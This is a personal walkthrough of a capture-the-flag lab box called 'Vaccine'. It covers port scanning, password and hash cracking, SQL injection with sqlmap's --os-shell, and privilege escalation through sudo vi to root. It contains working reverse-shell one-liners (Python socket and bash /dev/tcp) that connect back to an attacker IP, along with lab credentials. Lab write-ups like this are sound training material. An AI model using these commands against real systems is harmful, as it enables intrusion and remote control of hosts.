## `nmap 10.10.10.46 -sV -sC`

```
vagrant@vagrant-virtualbox ~> nmap 10.10.10.46 -sV -sC
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-31 14:53 CDT
Nmap scan report for 10.10.10.46
Host is up (0.049s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: MegaCorp Login
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.57 seconds
```

## `dirb`

Not really useful.

```
┌─[vagrant@vagrant-virtualbox]─[~]
└──╼ $dirb http://10.10.10.46/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Mar 31 13:33:22 2021
URL_BASE: http://10.10.10.46/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.10.46/ ----
+ http://10.10.10.46/index.php (CODE:200|SIZE:2312)                            
+ http://10.10.10.46/server-status (CODE:403|SIZE:276)                         
                                                                               
-----------------
END_TIME: Wed Mar 31 13:36:19 2021
DOWNLOADED: 4612 - FOUND: 2
```

## 

## http://10.10.10.46/

Login page. Time to try some creds!

None seemed to work.

Tried

    admin:MEGACORP_4dm1n!!
    admin:M3g4C0rpUs3r!
    robert:MEGACORP_4dm1n!!
    robert:M3g4C0rpUs3r!

I also tried setting this cookie value:

    user=34322
    role=admin

But that didn't yield results.

Then, I tried SQLMap, but no dice.

    sqlmap http://10.10.10.46 --forms

    [13:40:15] [WARNING] POST parameter 'password' does not seem to be injectable
    [13:40:15] [ERROR] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent', skipping to the next form

Going to try a combination of all the logins and creds using OWASP ZAP.

### ZAP 

Going to fuzz this request:

```
POST http://10.10.10.46/index.php HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0
Pragma: no-cache
Cache-Control: no-cache
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Referer: http://10.10.10.46/index.php
Host: 10.10.10.46
Cookie: PHPSESSID=pi34jts3c4nji40425njl3mk2r

username=$HERE$&password=$HERE$
```

With these strings:

```
MEGACORP_4dm1n!!
M3g4C0rpUs3r!
M3g4c0rp123
robert
34322
admin
administrator
admin@megacorp.com
8832
john
john@tafcz.co.uk
57633
Peter
peter@qpic.co.uk
28832
Rafol
tom@rafol.co.uk
86575
super admin
superadmin@megacorp.com
```

...and all the permutations result in similarly-long HTTP responses, likely meaning that these creds aren't valid.

## FTP brute-force, `ncrack`

I can connect to an FTP server on 10.10.10.46, so I'll try to credential stuff that.

    pushd payloads
    ncrack -U formfuzz.txt -P formfuzz.txt ftp://10.10.10.46
    popd

It appears that `ncrack` isn't working. 

## I am stuck 1

Okay, I'm stuck and want to get more acquainted with the tools, so I'm going to just consult the guide.

They say that there is FTP, SSH, and HTTP services running, which is what I found.

But then they say,

> The credentials ftpuser / mc@F1l3ZilL4 can be used to login to the FTP server.

Where did they get these creds from?! Maybe a brute force FTP attack?

I need to consult the previous guide for 'Oopsie'.

...

## Going back for FTP creds

YES, the cred was in the previous box, 'Oopsie', inside `/root/`... I guess I should have explored that.

Going to get the cred from the previous box now.

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
<FileZilla3>
    <RecentServers>
        <Server>
            <Host>10.10.10.46</Host>
            <Port>21</Port>
            <Protocol>0</Protocol>
            <Type>0</Type>
            <User>ftpuser</User>
            <Pass>mc@F1l3ZilL4</Pass>
            <Logontype>1</Logontype>
            <TimezoneOffset>0</TimezoneOffset>
            <PasvMode>MODE_DEFAULT</PasvMode>
            <MaximumMultipleConnections>0</MaximumMultipleConnections>
            <EncodingType>Auto</EncodingType>
            <BypassProxy>0</BypassProxy>
        </Server>
    </RecentServers>
</FileZilla3>
```

Got the cred, so I can connect to FTP now.

I downloaded `backup.zip` file, but it's password protected.

## Wordlist zip file brute force

Then, I decided to try to brute-force it, but it was taking too long, so I used

    fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt backup.zip

And bizarrely, the password was

    741852963

Apparently `rockyou.txt` has a bunch of number sequences in it.

## Hardcoded hash

In `index.php` on line 5, we can see this:

```php
if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
```

This means our cred is

    admin:2cb42f8734ea607eefed3b70af13bbd3

And can be processed by hashcat. But first, I'm going to look it up in an online md5 database.

It was `qwerty789`! Yay for laziness.

    admin:qwerty789

## Logged into site

The site just has this one page:

- <http://10.10.10.46/dashboard.php?search=test>

I need a valid PHP session ID cookie ("PHPSESSID") to send requests here, so I'm going to use `sqlmap` and pass it my authenticated PHPSESSID.

```
sqlmap http://10.10.10.46/dashboard.php?search=test --cookie="PHPSESSID=51ai5vlm0bsmiragl1lnv2t3qg"
```

This doesn't return anything sadly.

Maybe I need to use IDs returned from previous lab DB dump that I did?

## DB Dump IDs

Going to use OWASP ZAP to fuzz the input for an HTTP POST request:

```
GET http://10.10.10.46/dashboard.php?search=@FOO@ HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
DNT: 1
Connection: keep-alive
Referer: https://10.10.10.46/dashboard.php
Cookie: PHPSESSID=m0t26cnhl1iao1f9u48v2dfr80
Upgrade-Insecure-Requests: 1
Host: 10.10.10.46
```

## Trying `dirb`

Going to run `dirb` and see what directories it shows.

```
---- Scanning URL: http://10.10.10.46/ ----
+ http://10.10.10.46/index.php (CODE:200|SIZE:2312)                            
+ http://10.10.10.46/server-status (CODE:403|SIZE:276)                         
```

Nothing useful.

## It is SQLi!

The previous SQLi must have failed due to the shared box being broken in some way by the people sharing the box with me.

I came back the next day, and saw that this URL:

    http://10.10.10.46/dashboard.php?search=a%27

Results in this output near the end of the HTTP document:

        <tbody>
        ERROR:  unterminated quoted string at or near "'"
    LINE 1: Select * from cars where name ilike '%a'%'
                                                    ^

This shows me that I can inject SQL into this page -- and I should retry my `sqlmap` command.

## sqlmap part 2 

    sqlmap http://10.10.10.46/dashboard.php?search=test --cookie="PHPSESSID=51ai5vlm0bsmiragl1lnv2t3qg"

Looks like it succeeded, but I don't think a full DB dump was achieved from looking at the summary.

I'm a dummy -- I need to pass `--dump`...

    sqlmap "http://10.10.10.46/dashboard.php?search=test" --cookie="PHPSESSID=51ai5vlm0bsmiragl1lnv2t3qg"

It worked, and I got a full DB dump. Sadly only got one table from it -- I'm going to try to use Metasploit to exploit this SQLi further.

Not sure if I should be getting more tables, or if I should be trying command injection instead.

I just read this guide:

    https://www.hackers-arise.com/post/2017/04/24/database-hacking-part-4-extracting-data-with-sqlmap

And I should have added `--dbs`/`--tables`/`--columns` because those flags specifically enumerate entities. `sqlmap` tool will remember a per-host view of what the previously-enumerated entity names are.

I just realized `--all` does all enumeration, and I can do `--all` since I'm lazy.

    sqlmap "http://10.10.10.46/dashboard.php?search=test" --cookie="PHPSESSID=51ai5vlm0bsmiragl1lnv2t3qg" --all

See `db-dump/` for dumped tables.

## sqlmap but more targeted

Using the `--all` flag returned too much crap. I just found a single password hash, and it appears to be in an unknown format. It /looks/ like it's MD5, but it's too long and has an incorrect character.

I'm going to run `--dbs`/`--tables`/`--columns` separately.

### `--dbs`

This command gets a list of databases.

    sqlmap "http://10.10.10.46/dashboard.php?search=test" --cookie="PHPSESSID=51ai5vlm0bsmiragl1lnv2t3qg" --dbs

returns

    available databases [3]:
    [*] information_schema
    [*] pg_catalog
    [*] public

### `-D public --dump`

This command dumps all rows in the `public` database.

    sqlmap "http://10.10.10.46/dashboard.php?search=test" --cookie="PHPSESSID=51ai5vlm0bsmiragl1lnv2t3qg" -D public --dump

Gets us:

    Database: public
    Table: cars
    [10 entries]
    +----+--------+---------+--------+----------+
    | id | name   | type    | engine | fueltype |
    +----+--------+---------+--------+----------+
    | 1  | Elixir | Sports  | 2000cc | Petrol   |
    | 2  | Sandy  | Sedan   | 1000cc | Petrol   |
    | 3  | Meta   | SUV     | 800cc  | Petrol   |
    | 4  | Zeus   | Sedan   | 1000cc | Diesel   |
    | 5  | Alpha  | SUV     | 1200cc | Petrol   |
    | 6  | Canon  | Minivan | 600cc  | Diesel   |
    | 7  | Pico   | Sed     | 750cc  | Petrol   |
    | 8  | Vroom  | Minivan | 800cc  | Petrol   |
    | 9  | Lazer  | Sports  | 1400cc | Diesel   |
    | 10 | Force  | Sedan   | 600cc  | Petrol   |
    +----+--------+---------+--------+----------+

Not that useful. `public` database doesn't get us anything. And `pg_catalog` and `information_schema` are both just internal database schemas.


## I'm stuck!

Going to review the guide as to not waste time like the last 2 boxes.

Interesting - They use JohnTheRipper to crack the zip password. Didn't know it could do that. I used `fcrackzip`.

They also use "Crackstation" to crack the MD5 hash inside the PHP file, while I used some random website.

FML. Wasted my time on trying to dump the tables again.

I was supposed to use `--os-shell`.

## `--os-shell`

    sqlmap "http://10.10.10.46/dashboard.php?search=test" --cookie="PHPSESSID=51ai5vlm0bsmiragl1lnv2t3qg" --os-shell --random-agent

Great!

    [12:18:05] [INFO] fingerprinting the back-end DBMS operating system
    [12:18:06] [INFO] the back-end DBMS operating system is Linux
    [12:18:06] [INFO] testing if current user is DBA
    [12:18:06] [INFO] retrieved: '1'
    [12:18:06] [INFO] going to use 'COPY ... FROM PROGRAM ...' command execution
    [12:18:06] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER

...And the shell sucks ass. Time to upgrade it.

Also, you can use `msfvenom` to generate reverse shell commands. See <https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/> for more info.

Attacker runs:

    nc -lvp 6969

Victim runs:

    python -c 'attackerip="10.10.15.25";attackerport=6969;print('wew');import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((attackerip,attackerport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

And to upgrade:

    python -c 'import pty; pty.spawn("/bin/bash")'


## can't upgrade shell

...

Okay, I can't `cd` or run `python -c "print 'lol'"`.

Time to consult the guide again. I don't think that `--os-shell` does exactly what I think it does.

...

Apparently I am supposed to use a reverse shell, but not `python`.


Attacker:

    nc -lvp 6969

Victim:

    bash -c 'bash -i >& /dev/tcp/10.10.15.25/6969 0>&1'

Upgrade:

    SHELL=/bin/bash script -q /dev/null

Well, we have a reverse shell.

    postgres@vaccine:/var/lib/postgresql/11/main$ whoami
    whoami
    postgres

I'm going to keep reading the guide as to not waste time - There are a lot of things I would never find out on my own.

## /var/www/html

A running theme, at least with PHP apps, is going to `/var/www/html/` folder. The guide says to check here.

## dashboard.php

Line 41:

    $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");

`postgres:P@s5w0rd!`!

If you don't upgrade the shell, you will get an error related to password entry:

    sudo: no tty present and no askpass program specified

According to the guide, we should then run `sudo -l`. WTF is that? Let's run `man sudo`.

Apparently it lists all the allowed commands the current user can run.

    postgres@vaccine:/var/www/html$ sudo -l        
    sudo -l
    [sudo] password for postgres: P@s5w0rd!

    Matching Defaults entries for postgres on vaccine:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User postgres may run the following commands on vaccine:
        (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf

So we can run `/bin/vi /etc/postgresql/11/main/pg_hba.conf`.

I had no idea what to do here.

Guide again.

So, `vi` can run commands.

If I run `vi` as root with:

    sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf

And then, inside `vi`, type:

    <ESC>:!/bin/bash<ENTER>

I should spawn a root shell. Let's try it.

It worked! See the wonky output below. Line 11. `^[` is `<ESC>`. Below the content of the `/etc/postgresql/11/main/pg_hba.conf` file, you can see shell commands.


    # DO NOT DISABLE!
    # If you change this first entry you will need to make sure that the
    # database superuser can access the database using some other method.
    # Noninteractive access to all databases is required during automatic
    # maintenance (custom daily cronjobs, replication, and similar tasks).
    #
    # Database administrative login by Unix domain socket

    # TYPE  DATABASE        USER            ADDRESS                 METHOD

    local   all             postgres                                iden^[:!/bin/bash
    # "local" is for Unix domain socket connections only
    local   all             all                                     peer
    # IPv4 local connections:
    host    all             all             127.0.0.1/32            md5
    # IPv6 local connections:
    host    all             all             ::1/128                 md5
    # Allow replication connections from localhost, by a user with the
    # replication privilege.
    local   replication     all                                     peer
    host    replication     all             127.0.0.1/32            md5
    host    replication     all             ::1/128                 md5
    :!/bin/bash
    root@vaccine:/var/lib/postgresql/11/main# whoami
    whoami
    root
    root@vaccine:/var/lib/postgresql/11/main# 

In `/root/` you can find the flag.

Still looking for the user flag but I have root for now.